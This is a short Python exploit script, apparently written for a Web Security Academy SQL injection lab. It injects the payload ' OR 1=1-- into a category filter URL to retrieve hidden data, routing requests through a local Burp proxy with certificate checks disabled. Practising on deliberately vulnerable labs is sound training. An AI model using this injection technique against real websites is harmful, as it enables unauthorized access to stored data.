#!/usr/bin/env python3

"""
Python script for Web-Security-Academy SQLi lab 01

SYNOPSIS
========

::

  ./sqli-01.py https://web-security-academy.net "' OR 1=1 --

DESCRIPTION
===========
SQLi exploit script used to retrieve hidden data.
paylod used in Burp Repeater
' OR 1=1--
GET /filter?category=Accessories'+OR+1%3d1--
running the exploit/script will look like this:
"""
import requests
import sys
import urllib3
# disable insecure request warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(url, payload):
    uri = '/filter?category='
    r = requests.get(url + uri + payload, verify=False, proxies=proxies)
    if "Cat Grin" in r.text:
        return True
    else:
        return False

def main():
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(url, payload):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful!")


if __name__ == "__main__":
    main()

